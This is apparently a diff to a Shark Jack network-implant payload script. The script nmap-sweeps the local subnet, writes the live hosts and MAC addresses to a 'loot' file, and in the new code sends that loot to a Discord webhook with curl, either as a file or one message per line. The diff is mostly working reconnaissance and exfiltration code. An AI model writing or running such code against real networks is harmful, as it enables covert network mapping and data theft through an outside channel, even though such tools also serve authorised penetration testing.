@@ -17,8 +17,11 @@
 # Red.......................Failed C2/EXFIL/Scanning
 # Green.....................Finished
 
+# Turn on Discord Integration (Yes = 1, No = 0)
 DISCORD=0
 WEBHOOK='PLACE_DISCORD_WEBHOOK_HERE'
+# Send Loot as File or Plain Messages (File = 1, Messages = 0)
+AS_FILE=0
 
 if [ -f "/etc/device.config" ]; then
         INITIALIZED=1
@@ -58,7 +61,8 @@ else
         printf "\n       Public IP: ${PUBLIC_IP}\n    Online Devices for ${SUBNET}:\n--------------------------------------------\n\n" >> "$LOOT_FILE"
         LED C VERYFAST
 		run_nmap () {
-                nmap -sn --privileged "$SUBNET" --exclude "$INTERNAL_IP" | awk '/Nmap scan report for/{printf " -> ";printf $5;}/MAC Address:/{print " - "substr($0, index($0,$3)) }' >> "$LOOT_FILE"		
+                nmap -sn --privileged "$SUBNET" --exclude "$INTERNAL_IP" | awk '/Nmap scan report for/{printf " -> ";printf $5;}/MAC Address:/{print " - "substr($0, index($0,$3)) }' >> "$LOOT_FILE"
+				
         }
         run_nmap &
         PID=$!
@@ -73,8 +77,16 @@ else
 							opkg update;opkg install libcurl curl;
 						fi
 						LED Y SOLID
-						FILE=\"$LOOT_FILE\"
-						curl -s -i -H 'Content-Type: multipart/form-data' -F FILE=@$FILE -F 'payload_json={ "wait": true, "content": "Loot has arrived!", "username": "SharkJack" }' $WEBHOOK
+						if [ "$AS_FILE" == 1 ]; then
+							FILE=\"$LOOT_FILE\"
+							curl -s -i -H 'Content-Type: multipart/form-data' -F FILE=@$FILE -F 'payload_json={ "wait": true, "content": "Loot has arrived!", "username": "SharkJack" }' $WEBHOOK
+						fi
+						if [ "$AS_FILE" == 0 ]; then
+							while read -r line; do
+								DISCORD_MSG=\"**$line**\"
+								curl -H "Content-Type: application/json" -X POST -d "{\"content\": $DISCORD_MSG}"  $WEBHOOK
+							done < "$LOOT_FILE"
+						fi
 						LED G SOLID;sleep 2;
 				fi
                 if [ "$INITIALIZED" == 1 ]; then
